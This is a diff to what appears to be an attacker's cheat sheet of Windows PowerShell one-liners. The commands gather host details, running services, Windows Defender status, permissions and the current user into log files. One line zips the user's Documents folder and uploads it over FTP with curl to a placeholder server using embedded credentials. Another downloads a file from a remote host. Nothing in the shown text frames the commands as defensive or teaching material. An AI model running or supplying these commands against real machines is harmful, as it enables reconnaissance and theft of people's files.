@@ -1,8 +1,10 @@
 RECON:
 (Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft > blah.txt); (Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl >> blah.txt); (Get-MpComputerStatus >> blah.txt)
+($a="b.log";$b="C:\\Windows";icacls $b > $a;whoami >> $a;Get-WmiObject -Class Win32_OperatingSystem|select SystemDirectory,BuildNumber,SerialNumber,Version|ft >> $a;Get-MpComputerStatus >> $a)
+
 
 FILE MANAGMENT:
-"(Compress-Archive -Path .\Documents\ -CompressionLevel Optimal -DestinationPath Documents.zip); (curl.exe -T .\Documents.zip ftp://SERVER/Documents.zip --user user:password)"
+"(Compress-Archive -Path .\Documents\ -CompressionLevel Optimal -DestinationPath d.zip); (curl.exe -T .\d.zip ftp://SERVER/d.zip --user user:password)"
 
 TRANSFER & GOODIES:
 'wget https://SOME-SERVER/picture.png -OutFile picture.png'
